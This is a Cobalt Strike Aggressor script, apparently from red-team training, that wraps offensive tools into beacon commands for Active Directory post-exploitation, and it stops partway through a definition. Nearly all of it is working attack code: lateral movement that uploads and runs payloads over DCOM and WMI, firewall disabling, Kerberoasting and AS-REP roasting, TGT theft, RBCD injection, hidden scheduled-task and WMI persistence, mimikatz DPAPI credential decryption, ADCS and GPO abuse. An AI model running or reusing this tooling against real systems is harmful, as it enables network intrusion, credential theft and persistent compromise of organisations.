# $1 is beacon id
# $2 target
# $3 selected listener

#GLOBAL VARIABLES
$SHARPWMI_BIN_PATH  = getFileProper("C:\\Tools\\SharpWMI\\SharpWMI\\bin\\Release","SharpWMI.exe");
$INVOKE_DCOM_PATH   = getFileProper("C:\\Tools","Invoke-DCOM.ps1");
$POWERVIEW_PATH     = getFileProper("C:\\Tools\\PowerSploit\\Recon", "PowerView.ps1");
$RUBEUS_PATH        = getFileProper("C:\\Tools\\Rubeus\\Rubeus\\bin\\Release","Rubeus.exe");
$SEATBELT_PATH      = getFileProper("C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Release","Seatbelt.exe");
$ADSEARCH_PATH      = getFileProper("C:\\Tools\\ADSearch\\ADSearch\\bin\\Release","ADSearch.exe");
$SHAREPERSIST_PATH  = getFileProper("C:\\Tools\\SharPersist\\SharPersist\\bin\\Release","SharPersist.exe");
$SHARPUP_PATH       = getFileProper("C:\\Tools\\SharpUp\\SharpUp\\bin\\Release","SharpUp.exe");
$GETSERVICEACL_PATH = getFileProper("c:\\Tools","Get-ServiceAcl.ps1");
$POWERLURK_PATH     = getFileProper("C:\\Tools","PowerLurk.ps1");
$CERTIFY_PATH       = getFileProper("C:\\Tools\\Certify\\Certify\\bin\\Release","Certify.exe");
$SHARPGPOABUSE_PATH = getFileProper("C:\\Tools\\SharpGPOAbuse\\SharpGPOAbuse\\bin\\Release","SharpGPOAbuse.exe");
$POWERUP_PATH       = getFileProper("C:\\Tools\\PowerSploit\\Privesc","PowerUp.ps1");
$POWERUPSQL_PATH    = getFileProper("C:\\Tools\\PowerUpSQL","PowerUpSQL.ps1");
$SQLRECON_PATH      = getFileProper("C:\\Tools\\SQLRecon\\SQLRecon\\SQLRecon\\bin\\Release","SQLRecon.exe");
$SHARPSCCM_PATH     = getFileProper("C:\\Tools\\SharpSCCM\\bin\\Release","SharpSCCM.exe");
$STANDIN_PATH       = getFileProper("C:\\Tools\\StandIn\\StandIn\\StandIn\\bin\\Release","StandIn.exe");
$WHISKER_PATH       = getFileProper("C:\\Tools\\Whisker\\Whisker\\bin\\Release","Whisker.exe");
$WINDIRVERT_DRIVER  = getFileProper("C:\\Tools\\PortBender","WinDivert64.sys");
$PORTBENDER_DLL     = getFileProper("C:\\Tools\\PortBender","PortBender.dll");
$KRBRELAY_PATH      = getFileProper("C:\\Tools\\KrbRelay\\KrbRelay\\bin\\Release","KrbRelay.exe");
$SHARPSPOOL_PATH    = getFileProper("C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release","SharpSpoolTrigger.exe");

#TEST FUNCTION
command beacons {
   local('$entry $key $value');
   foreach $entry (beacons()) {
      println("== " . $entry['id'] . " ==");
      foreach $key => $value ($entry) {
         println("$[20]key : $value");
      }
      println();
   }
}

#dummy callback to get stuff to run in the correct order
sub dummby_cb{
    blog($1,$2);
}
#generate random printable text of $length
sub rand_alphanum {
    local('$length $out $charstr $i $index');
    $length = $1;
    $charstr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890';
    $out = '';
    for($i = 0; $i < $length; $i++)
    {
        $index = rand(strlen($charstr));
        $out = $out . substr($charstr, $index, $index + 1);
    }
    return $out;
}

#ADD INVOKE_DCOM TO JUMP COMMAND
sub invoke_dcom
{
    local('$handle $script $oneliner $filename $payload');

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\ $+ $filename $+ ", $payload);

    println("Invoke-DCOM Oneliner: " . $oneliner);
    println("Filename: ". $filename);
    #execute script from powerpick
    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command C:\\Windows\\ $+ $filename $+ ", $oneliner);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register("invoke-dcom", "x64", "Uses invoke_dcom.ps1 to run remote beacon", &invoke_dcom)

# ADD INVOKE-DCOM TO REMOTE-EXEC COMMAND
sub invoke_dcom_remoteexec
{
    local('$handle $script $oneliner');

    #beacon acknowledgement
    btask($1, "Task Beacon to run remote-exec on $2 via INVOKE_DCOM");

    #import the script
    $handle = openf($INVOKE_DCOM_PATH);
    $script = readb($handle, -1);
    closef($handle);

    #send script to beacon
    $oneliner = beacon_host_script($1, $script);

    bpowerpick($1, "Invoke-DCOM -ComputerName  $+ $2 $+  -Method MMC20.Application -Command  $+ $3 $+ ", $oneliner);
}
beacon_remote_exec_method_register("invoke-dcom", "Remote execute via powershell Invoke-DCOM", &invoke_dcom_remoteexec);

# ADD SHARPWMI TO JUMP COMMAND
sub sharpwmi
{
    local('$binpath $uploadpath $filename $args $payload')

    #beacon acknowledgement
    btask($1, "Task Beacon to run " . listener_describe($3) . " on $2 via SharpWMI");
    println("Running jump sharpwmi.");

    #define binary path
    $binpath = $SHARPWMI_BIN_PATH;

    #generate payload (stageless)
    $payload = artifact_payload($3, "exe", "x64");
    $filename = rand_alphanum(4) . ".exe";

    #upload payload to target
    $uploadpath = "\\\\ $+ $2 $+ \\C$\\Windows\\ $+ $filename $+ ";
    println("Uploading binary to:" . $uploadpath);
    bupload_raw($1, $uploadpath, $payload);

    #execute script from powerpick
    $args = "action=exec computername= $+ $2 $+  command= $+ $uploadpath $+ ";
    println("Execution args: " . $args);
    bexecute_assembly($1, $binpath, $args);

    #link if p2p beacon
    beacon_link($1, $2, $3);
}
beacon_remote_exploit_register(
    "sharpwmi",
    "x64",
    "Uses SharpWMI to run remote beacon",
    &sharpwmi
);

alias import_powerview {
    bpowershell_import($1, $POWERVIEW_PATH);
}
beacon_command_register(
    "import_powerview",
    "Imports Powerview into current beacon",
    "Imports Powerview into current beacon"
);

alias import_powerup {
    bpowershell_import($1, $POWERUP_PATH);
}
beacon_command_register(
    "import_powerup",
    "Imports PowerUp into current beacon"
);

alias import_powerupsql {
    bpowershell_import($1, $POWERUPSQL_PATH);
}
beacon_command_register(
    "import_powerupsql",
    "Imports PowerUpSQL into current beacon"
);

#FIREWALL ALIASES
alias shieldsdown {
    #This function creates a service on the remote host, starts it, and cleans it up.
    bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
}
beacon_command_register(
    "shieldsdown",
    "Disables host firewall"
);

alias openport {
    #powerpick new-netfirewallrule -displayname "8445-INBOUND" -Direction inbound -protocol tcp -action allow -localport 8445
    bpowerpick($1, "new-netfirewallrule -displayname \" $+ $2 $+ -INBOUND\" -Direction inbound -protocol tcp -action allow -localport  $+ $2 $- ")
}
beacon_command_register(
    "openport",
    "Opens the port specified",
    "Opens the port specified"
);

#EXECUTE ASSEMBLY ALIASES
alias rubeus {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $RUBEUS_PATH, $args);
}
beacon_command_register(
    "rubeus",
    "Execute Assmembly of Rubeus",
    "Execute Assmembly of Rubeus"
);
alias certify {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $CERTIFY_PATH, $args);
}
beacon_command_register(
    "certify",
    "Execute Assmembly of Certify",
    "Execute Assmembly of Certify"
);
alias seatbelt {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $SEATBELT_PATH, $args)
}
beacon_command_register(
    "seatbelt",
    "Execute Assmembly of Seatbelt",
    "Execute Assmembly of Seatbelt"
);
alias adsearch {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $ADSEARCH_PATH, $args)
}
beacon_command_register(
    "adsearch",
    "Execute Assmembly of ADSearch",
    "Execute Assmembly of ADSearch"
);
alias standin {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $STANDIN_PATH, $args);
}
beacon_command_register(
    "standin",
    "Execute Assmembly of StandIn",
    "Execute Assmembly of StandIn"
);
alias sharpspooltrigger {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $SHARPSPOOL_PATH, $args);
}
beacon_command_register(
    "sharpspooltrigger",
    "Execute Assmembly of SharpSpoolTrigger",
    "Execute Assmembly of SharpSpoolTrigger"
)

#SITUATIONAL AWARENESS FUNCTIONS
## FIND DOMAIN SHARES
alias get_domainShares {
    $size = size(@_);
    if ( $size == 1) {
        $command = 'Find-DomainShare -CheckShareAccess';
    } else if ( $size == 2) {
        $domain = @_[1];
        $command = 'Find-DomainShare -CheckShareAccess -ComputerDomain ' . $domain;
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
    bpowerpick($1, $command);
}
beacon_command_register (
    "get_domainShares",
    "Uses PowerView to find Domain Shares and check perms",
    "Uses PowerView to find Domain Shares and check perms\n\n"
    . "Usage: get_domainShares (domain)"
)
#KERBEROASTING
##FIND TARGETS
alias kerberos_roast_findtargets {
    bpowerpick($1, 'Get-NetUser -SPN | select serviceprincipalname,userprincipalname');
}
beacon_command_register(
    "kerberos_roast_findtargets",
    "User PowerView to find SPNs",
    "User PowerView to find SPNs"
);

##GRABBING KRB5TGS HASH
sub kerberos_roast_tgsreq_cb{
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 13100 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5tgs --wordlist=wordlist <user>'");
}
alias kerberos_roast_tgsreq{
    bexecute_assembly($1, $RUBEUS_PATH, 'kerberoast /nowrap /user:' . $2, $null, &kerberoast_tgsreq_cb);
}
beacon_command_register(
    "kerberos_roast_tgsreq",
    "Request the TGS with Rubeus"
);

#AS-REP ROASTING
##FIND TARGETS
alias kerberos_asreproast_findtargets {
   bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname');
}
beacon_command_register(
    "kerberos_asreproast_findtargets",
    "Find AS-REP roastable targets",
    "Find AS-REP roastable targets"
);

##REQUEST HASH
sub asreproast_requesthash_cb {
    blog($1, $2);
    blog($1, "Cracking with Hashcat:'hashcat -a 0 -m 18200 hashes.txt wordlist.txt'");
    blog($1, "Cracking with John:'john --format=krb5asrep --wordlist=wordlist <user>'");
}
alias kerberos_asreproast_requesthash {
    bexecute_assembly($1, $RUBEUS_PATH, 'asreproast /nowrap /user:' . $2, $null, &asreproast_requesthash_cb);
}
beacon_command_register(
    "kerberos_asreproast_requesthash",
    "Get the specified user KRB5ASREP hash",
    "Get the specified user KRB5ASREP hash"
);

#UNCONSTRAINED DELEGATION
##FINDING TARGETS
alias kerberos_unconstdel_findtargets {
    # bexecute_assembly($1, $ADSEARCH_PATH, '--search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname')
    bexecute_assembly($1, $ADSEARCH_PATH, '--search "(userAccountControl:1.2.840.113556.1.4.803:=524288)" --attributes samaccountname,dnshostname')
}
beacon_command_register(
    "kerberos_unconstdel_findtargets",
    "ADSearch to find Unconstrained Delegation Targets",
    "ADSearch to find Unconstrained Delegation Targets"
)

#CONSTRAINED DELEGATION
##FINDING TARGETS
alias kerberos_constdel_findtargets {
    # bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(&(objectCategory=computer)(msds-allowedtodelegateto=\*))\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
    bexecute_assembly($1, $ADSEARCH_PATH, "--search \"(msds-allowedtodelegateto=\*)\" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json")
}
beacon_command_register(
    "kerberos_constdel_findtargets",
    "Find Constrained Delegation Targets"
);

##TRIAGE THEN DUMP TGT
sub constdel_stealtgt_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$hostname $regx_luid $luid');

    $hostname = lc(binfo($1, "computer"));
    #println("hostname: " . $hostname);

    $regx_luid = '(0x\w+).*' . $hostname . '\$';
    
    $luid = matches($2, $regx_luid)[0];

    blog($1, $2);
    blog($1, "Targetting LUID:" . $luid);

    #dump ticket for krbtgt with $luid
    bexecute_assembly($1, $RUBEUS_PATH, "dump /nowrap /service:krbtgt /luid:" . $luid);
}
alias kerberos_constdel_stealtgt {
    #execute assembly and pass results to helper sub, run LUID
    if(-isadmin $1){
    bexecute_assembly($1, $RUBEUS_PATH, "triage /service:krbtgt", $null, &constdel_stealtgt_cb);
    } else {
        berror("Must be run from elevated access.");
    }
}
beacon_command_register(
    "kerberos_constdel_stealtgt",
    "Steal the local machine TGT",
    "Steal the local machine TGT"
);

#ROLE BASED CONSTRAINED DELEGATION
##FINDING TARGETS.
sub kerberos_rbcd_findtargets_cb {
    local('$regex $sid $command');
    blog($1,$2);

    $regex = '(.*)-513';
    $sid = matches($2, $regex)[0];
    blog($1, "Targetting SID: " . $sid);

    $command = 'Get-DomainComputer |'
    . 'Get-DomainObjectAcl -ResolveGUIDs |'
    . '? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "'
    . $sid
    . '-[\d]{4,10}" }';

    bpowerpick($1,$command);
}
alias kerberos_rbcd_findtargets {
    $command = 'Convert-NameToSid "Domain Users"';
    bpowerpick($1, $command, $null, $null, &kerberos_rbcd_findtargets_cb)
}
beacon_command_register(
    "kerberos_rbcd_findtargets",
    "Find Role Based Constrained Delegation Machines");

alias kerberos_rbcd_injectspn {
    $size = size(@_);
    if ($size == 3) {
        $target    = @_[1];
        $donorsid  = @_[2];

        blog($1, "TARGET = " . $target . "\ndonorside = " . $donorsid);
        $parameters = "\$rsd\="
        . 'New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;'
        . $donorsid
        . ')";'
        . ' $rsdb = New-Object byte[] ($rsd.BinaryLength);'
        . ' $rsd.GetBinaryForm($rsdb, 0);'
        . ' Get-DomainComputer -Identity "'
        . $target
        . '" |'
        . " Set-DomainObject -Set @\{\'msDS-AllowedToActOnBehalfOfOtherIdentity\' = \$rsdb\} -Verbose";
        
        bpowerpick($1, $parameters);
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
}
beacon_command_register(
    "kerberos_rbcd_injectspn",
    "Uses PowerView to inject SDDL into a target machine from a compromised machine account",
    "Uses PowerView to inject SDDL into a target machine from a compromised machine account\n\n"
    . "Usage: kerberos_rbcd_injectspn [target machine] [donor machine sid]\n"
)

alias kerberos_rbcd_removespn {
    $size   = size(@_);
    $target = @_[1];
    if ($size == 2) {
    $command = "Get-DomainComputer -Identity "
    . $target
    . " | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity";
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
}
beacon_command_register (
    "kerberos_rbcd_removespn",
    "Use PowerView to clear msDS-AllowedToActOnBehalfOfOtherIdentity value",
    "Use PowerView to clear msDS-AllowedToActOnBehalfOfOtherIdentity value\n\n"
    . "Usage: kerberos_rbcd_removespn [target]\n"
)

#PERSISTANCE METHODS
## SCHEDULED TASKS
alias persist_schtask {
    $rand = rand_alphanum(4);

    if ( $2 ismatch 'psh') {
        blog($1, "Executing Powershell Persistance");
        $b64payload = $3;
        
        $parameters = '-t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"';
        $parameters = $parameters . ' -a "-nop -w hidden -enc ' . $b64payload. '"';
        $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
    } else if ( $2 ismatch 'local' ) {
        blog($1, "Executing Local Binary Persistance");
        $payload = $3;

        $parameters = '-t schtask -c "' . $payload . '"';
        $parameters = $parameters . ' -n "Updater-' . $rand . '" -m add -o hourly';
    } else {
        berror($1, "Invalid Parameter.");
        return;
    }

    bexecute_assembly($1, $SHAREPERSIST_PATH, $parameters);
}
beacon_command_register(
    "persist_schtask",
    "Does persistance stuff",
    "Install a backdoored scheduled task\n"
    . "Takes a base64 encoded command for powershell\n"
    . "or a path to an executable to run hourly\n\n"
    . "Usage:\npersist_schtask psh [base64]\n"
    . "persist_schtask local [path] "
);

##WMI EVENTS
alias persist_wmievent{
    #$1 beaconid
    #$2 name
    #$3 processname
    #$4 listener

    #check if beacon is elevated
    if(-isadmin $1){
        #beacon acknowledgement
        btask($1, "Task Beacon to register WMI Event");

        #import the script
        $handle = openf($POWERLURK_PATH);
        $script = readb($handle, -1);
        closef($handle);

        #send script to beacon
        $oneliner = beacon_host_script($1, $script);

        #generate payload (stageless)
        $payload = artifact_payload($4, "exe", "x64");
        $filename = rand_alphanum(4) . ".exe";

        #upload payload to target
        $upload_path = "C:\\Windows\\Temp\\ $+ $filename $+ ";
        bupload_raw($1, $upload_path , $payload);

        bpowerpick($1, "Register-MaliciousWmiEvent -EventName $2 -PermanentCommand \" $+ $upload_path $+ \" -Trigger ProcessStart -ProcessName $3", $oneliner);
    } else {
        berror($1, "Can only be run from elevated access.");
    }
}
beacon_command_register(
    "persist_wmievent",
    "Use PowerLurk to create triggers for wmi events",
    "Usage: persist_wmievent [Name] [ProcessName] [listener]"
)

#PRIVILEGE ESCALATION HELPERS
##UNQUOTED SERVICE PATHS
alias privesc_unquotedpath {
    bexecute_assembly($1, $SHARPUP_PATH, "audit UnquotedServicePath");
}
beacon_command_register(
    "privesc_unquotedpath",
    "Checkes Unquoted Paths",
    "Uses SharpUp to check for unquoted service paths"
);

##WEAK SERVICE PERMS
sub privesc_weaksvcperms_cb {
    #Arguments: $1 = beacon ID, $2 = results, $3 = information map
    local('$regx_service $service $script $oneliner');
    
    $regx_service = '\sService \'(\w+)\'';
    
    $services = matches($2, $regx_service);
    
    blog($1, $2);

    foreach $service ($services) {
        blog($1, "Vulnerable Services: ". $service);

        #import the script
        $handle = openf($GETSERVICEACL_PATH);
        $script = readb($handle, -1);
        closef($handle);

        #send script to beacon
        $oneliner = beacon_host_script($1, $script);

        bpowerpick($1, "get-serviceacl -name " . $service . " | select -expand Access", $oneliner);

    }
}
alias privesc_weaksvcperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServices", $null, &privesc_weaksvcperms_cb);
}
beacon_command_register(
    "privesc_weaksvcperms",
    "Checkes for weak service permissions",
    "Uses SharpUp to check for weak service permissions"
);

##WEAK SERVICE BINARY PERMS
sub privesc_weaksvcbinaryperms_cb {
    blog($1, $2);
    blog($1, "Use 'powerpick get-acl -Path <binpath> | fl' to check permissions");
    
}

alias privesc_weaksvcbinaryperms {
    bexecute_assembly($1, $SHARPUP_PATH, "audit ModifiableServiceBinaries", $null, &privesc_weaksvcbinaryperms_cb);
}
beacon_command_register(
    "privesc_weaksvcbinaryperms",
    "Checkes for weak service binary permissions",
    "Uses SharpUp to check for weak service binary permissions"
);

#DPAPI HACKAGE
##STORED USER CREDS
###FIND VAULTS
sub dpapi_findvaults_cb{
    blog($1, $2);
    blog($1, "Check for potential creds to target.");
}
alias dpapi_findvaults {
    bexecute_assembly($1, $SEATBELT_PATH, "WindowsVault", $null, &dpapi_findvaults_cb);
}
beacon_command_register("dpapi_findvaults", "Locate DPAPI Vaults w/ Seatbelt");

###FIND CREDENTIAL FILS
sub dpapi_findcredfiles_cb{
    blog($1, $2);
    blog($1, "Note the master key guid\nUse 'powerpick get-domainuser bfarmer | select -expand objectsid' to get userSID");
}
alias dpapi_findcredfiles {
    bexecute_assembly($1, $SEATBELT_PATH, "WindowsCredentialFiles", $null, &dpapi_findcredfiles_cb);
}
beacon_command_register("dpapi_findcredfiles", "Locate DPAPI Vaults w/ Seatbelt");

###REQUEST MASTERKEY FROM DC VIA RPC
alias dpapi_reqBackupMasterKey {
    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Roaming\\Microsoft\\Protect\\ $+ $3 $+ \\ $+ $4 $+ ";
    println("CredPath: " . $credpath);
    bmimikatz($1, "@dpapi::masterkey /in: $+ $credpath $+  /rpc");
}
beacon_command_register(
    "dpapi_reqBackupMasterKey",
    "Use mimikatz to request backup Masterkey from DC",
    "Usage: dpapi_reqBackupMasterKey [userid] [userSID] [MasterKeyGUID]"
);

###DECRYPT CREDENTIAL FILE
alias dpapi_decryptCredFile {
    #$2 (username)
    #$3 (Credential File UID)
    #$4 (master key)

    $credpath = "C:\\Users\\ $+ $2 $+ \\AppData\\Local\\Microsoft\\Credentials\\ $+ $3 $+ ";
    bmimikatz($1, "dpapi::cred /in: $+ $credpath $+  /masterkey: $+ $4 $+ ");
}
beacon_command_register(
    "dpapi_decryptCredFile",
    "Decrypte Credential with DPAPI Master Key",
    "Usage: dpapi_decryptCredFile [username] [Cred File UID] [MasterKey]"
);

##STORED SCHEDULED TASK CREDS
###FIND CREDENTIAL FILES
$files = @();
$currentfile = "";
$masterkey = '';
sub dpapi_schtask_listCredFiles_mimicred_cb {
    #$1 = beacon ID, $2 = results, $3 = information map
    #guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
    local('$regex');
    $regex = 'guidMasterKey.*\{(.*)\}';
    $masterkey = matches($2, $regex)[0];
    blog($1, "KeyGUID: " . $masterkey . " " . "File: " . $currentfile);
}
sub dpapi_schtask_listCredFiles_lscb {
    #$1 = beacon ID, $2 = the folder, $3 = results
    local('$regex');
    $regex = '(\p{XDigit}{32})';
    $files = matches($3, $regex);
    # blog($1, "Found Credential Files: " . $files);
    foreach $file ($files){
        $currentfile = $file;
        bmimikatz($1, "dpapi::cred /in: $+ $path $+ \\ $+ $file $+ ",$null,$null,&dpapi_schtask_listCredFiles_mimicred_cb);
    }
    blog($1, "Run the command 'mimikatz !sekurlsa::dpapi' to find the master key for the corresponding GUID")
}
alias dpapi_schtask_listCredFiles {
    $path = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials";
    bls($1, $path, &dpapi_schtask_listCredFiles_lscb);
}
beacon_command_register(
    "dpapi_schtask_listCredFiles",
    "List Scheduled Task Credential Files"
)

###GET CRED FILE MASTER KEY AND DECRYPT
alias dpapi_schtask_decryptCredFiles {
    #$1 =  beacon, $2 FileID, $3 MasterKey
    $mimikatzCommand = 'dpapi::cred ' .
    "/in:C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\ $+ $2 $+  " .
    "/masterkey: $+ $3 $+ ";

    bmimikatz($1, $mimikatzCommand);
}
beacon_command_register (
    "dpapi_schtask_decryptCredFiles",
    "Decrypt given Scheduled Tasks Credential File",
    "Usage: dpapi_schtask_decryptCredFiles [FileID] [MasterKey]"
);

#ADCS
##FIND CERT AUTHORITY
alias adcs_findcas {
    bexecute_assembly($1, $CERTIFY_PATH, "cas");
}
beacon_command_register(
    "adcs_findcas",
    "Find the Certificate Authority Server"
);

##FIND VULNERABLE TEMPLATES
alias adcs_checktempaltes{
    bexecute_assembly($1, $CERTIFY_PATH, "find /vulnerable");
}
beacon_command_register(
    "adcs_checktempaltes",
    "Look for vulnerable ADCS templates"
);

##FIND LOCAL CERTIFICATES
alias adcs_checklocalcerts{
    # bexecute_assembly($1, $CERTIFY_PATH, "find /vulnerable");
    bexecute_assembly($1, $SEATBELT_PATH, "Certficates");
}
beacon_command_register(
    "adcs_checklocalcerts",
    "Check for local User Certs",
    "Check for local User Certs\n\n"
    . "Can export certs with \'mimikatz crypto::certificates /export\'\n"
);

#GPO ABUSE METHODS
##FIND MODIFIABLE GPOs
sub gpo_findvulngpos_cb {
    local('$command')
    blog($1, $2);
    
    $regex = '(.*)-513';
    $sid = matches($2, $regex)[0];
    blog($1, "Targetting SID: " . $sid);

    $command = 'Get-DomainGPO'
    . ' | Get-DomainObjectAcl -ResolveGUIDs'
    . ' | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "'
    . $sid
    . '-[\d]{4,10}" }';
    bpowerpick($1, $command);
}
alias gpo_findvulngpos {
    $command = 'Convert-NameToSid "Domain Users"';
    bpowerpick($1, $command, $null, $null, &gpo_findvulngpos_cb)
}
beacon_command_register(
    "gpo_findvulngpos",
    "Use PowerPick to find modifiable GPOs",
    "Use PowerPick to find modifiable GPOs"
);
alias gpo_getdetails {
    $gpodn = @_[1];
    $command = "Get-DomainGPO -Identity \"" . $gpodn . "\" | select displayName, gpcFileSysPath";
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_getdetails",
    "Returns DisplayName & GPC File Path for a GPO ND",
    "Returns DisplayName & GPC File Path for a GPO ND"
    . "Usage: gpo_getdetails [GPO DN]"
)
alias gpo_locategpo {
    #bpowershell_import($1, $POWERVIEW_PATH);
    $command = "Get-DomainGPO -Identity \" $+ $2 $+ \" | select displayname,gpcfilesyspath";
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_locategpos",
    "Use PowerPick to find modifiable GPOs",
    "Usage: gpo_locategpos [GPO DN]"
);
alias gpo_convertfromsid {
    $command = "ConvertFrom-SID  $+ $2 $+ ";
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_convertfromsid",
    "Use PowerPick to find modifiable GPOs",
    "Usage: gpo_convertfromsid [SID]"
);
alias gpo_checklinks {
    $guid = @_[1];
    $command = "Get-DomainOU -GPLink \"\{" . $guid . "\}\" | select name,distinguishedname";
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_checklinks",
    "Use PowerPick to find GPO Links",
    "Use PowerPick to find GPO Links\n\n"
    . "Usage: gpo_checklinks [GPO GUID]"
);
alias gpo_listOuMembers {
    $dn = @_[1];
    $command = "Get-DomainComputer -SearchBase \"" . $dn . "\" | select dnsHostName";
    bpowerpick($1, $command);
}
beacon_command_register(
    "gpo_listOuMembers",
    "Use PowerPick to find Computer in an OU",
    "Use PowerPick to find Computer in an OU\n\n"
    . "Usage: gpo_listOuMembers [OU DN]"
);
alias gpo_sharpgpoabuse {
    $size = size(@_);
    $args = join(" ", sublist(@_, 1, $size));
    bexecute_assembly($1, $SHARPGPOABUSE_PATH, $args);
}
beacon_command_register(
    "gpo_sharpgpoabuse",
    "Calls SharGPOAbuse.exe",
    "Usage: gpo_sharpgpoabuse <command>"
)
alias gpo_addComputerScript {
    $size = size(@_);

    if ( $size >= 3) {
        $GPOName    = @_[1];
        $scriptname = rand_alphanum(5) . ".bat";
        $script     = join(" ", sublist(@_, 2, $size));
        $parameters    = "--AddComputerScript"
        . " --GPOName \"" . $GPOName . "\""
        . " --ScriptName " . $scriptname
        . " --ScriptContents \"" . $script . "\""
    } else {
        berror($1, "Invalid Parameters!");
        return;
    }
    bexecute_assembly($1, $SHARPGPOABUSE_PATH, $parameters)
}
beacon_command_register(
    "gpo_addComputerScript",
    "Uses SharpGPOAbuse to add computer script to OU",
    "Uses SharpGPOAbuse to add computer script to OU\n\n"
    . "Usage:gpo_addComputerScript [GPO Name] [script contents]\n\n"
    . "Example:\n"
    . "gpo_addComputerScript \"Vulnerbale GPO\" start /b \\\\host.domain.local\\openshare\\beacon.exe\n"
)
sub gpo_checkcreateandlink_cb {
    blog($1, "Targetting Domain: " $2);

    $string = replace($2, '\.', ",DC=");
    $string = replace($string, "\n", "");
    $dn = 'CN=Policies,CN=System,DC=' . $string;

    $createchild_command = 'Write-host "Groups that can create GPOS:";'
    . ' Get-DomainObjectAcl -Identity "' . $dn . '"'
    . ' -ResolveGUIDs | ? { $_.ObjectAceType -eq '
    . '"Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | '
    . '% { ConvertFrom-SID $_.SecurityIdentifier }';

    $link_command = 'Write-host "Groups that can Link GPOS:";'
    . ' Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl';
    
    $command = $createchild_command . ';' . $link_command;
    bpowerpick($1, $command);
    
}
alias gpo_checkcreateandlink {
    $command = "Get-Domain | select -expand Name";
    bpowerpick($1, $command, $null, $null, &gpo_checkcreateandlink_cb);
}
beacon_command_register(
    "gpo_checkcreateandlink",
    "Use PowerView to check for groups with GPO Create perms",
    "Use PowerView to check for groups with GPO Create perms\n\n"
    . "Use Windows PowerShell RSAT tools to create new GPOs\n"
)

#MSSQL HELPERS
## FIND SQL INSTANCES FROM DOMAIN
alias mssql_findinstances {
    bpowerpick($1, "Get-SQLInstanceDomain");
}
beacon_command_register(
    "mssql_findinstances",
    "Use PowerUpSQL to find MSSQL server instances"
);

alias mssql_connectiontest {
    bpowerpick($1, "Get-SQLConnectionTest -Instance \" $+ $2 $+ \"");
}
beacon_command_register(
    "mssql_connectiontest",
    "Use PowerUpSQL to test connction to a MSSQL server instances",
    "Usage: mssql_connectiontest [instance]"
);

alias mssql_getinstanceinfo {
    bpowerpick($1, "Get-SQLServerInfo -Instance \" $+ $2 $+ \"");
}
beacon_command_register(
    "mssql_getinstanceinfo",
    "Use PowerUpSQL to test connction to a MSSQL server instances",
    "Usage: mssql_getinstanceinfo [instance]"
);

alias mssql_guessdomaingroups {
    $query = 'Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }';
    bpowerpick($1, $query);
}
beacon_command_register(
    "mssql_guessdomaingroups",
    "Use PowerView to find AD Groups like *SQL*",
    "Usage: mssql_guessdomaingroups [instance]"
);

## TEST AUTHENTICATION
alias mssql_accesstestme {
